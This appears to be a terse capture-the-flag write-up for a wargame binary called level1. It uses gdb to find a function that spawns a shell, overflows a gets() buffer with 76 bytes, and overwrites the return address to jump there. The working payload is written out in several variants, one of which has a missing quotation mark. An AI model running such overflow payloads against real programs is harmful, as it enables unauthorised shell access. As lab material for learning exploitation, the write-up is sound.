the program seem's to only wait for input from stdin and exit

gdb level1

disas main

we can gather more informations with info functions

we can see an function 'run()' right before our main()

disas main
disas run

run call fwrite then system "/bin/sh"

Since this is using gets we can overflow

gdb> run < <(python -c "print 'a' * 80")

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()

we got a nice segfault since we're trying to access address 0x61*** which is an invalid addr

that's nice it mean we overwriting return address (eip) so we can go where we want

p run give us the adress of run function
0x8048444

./level1 < <(python -c 'print "a" * 76 + "\x44\x84\x04\x08"')

we need to keep stdin open

cat <(python -c 'print "a" * 76 + \x44\x84\x04\x08"') - | ./level1

or

(python -c 'print "a" * 76 + "\x44\x84\x04\x08"'; cat  -) | ./level1
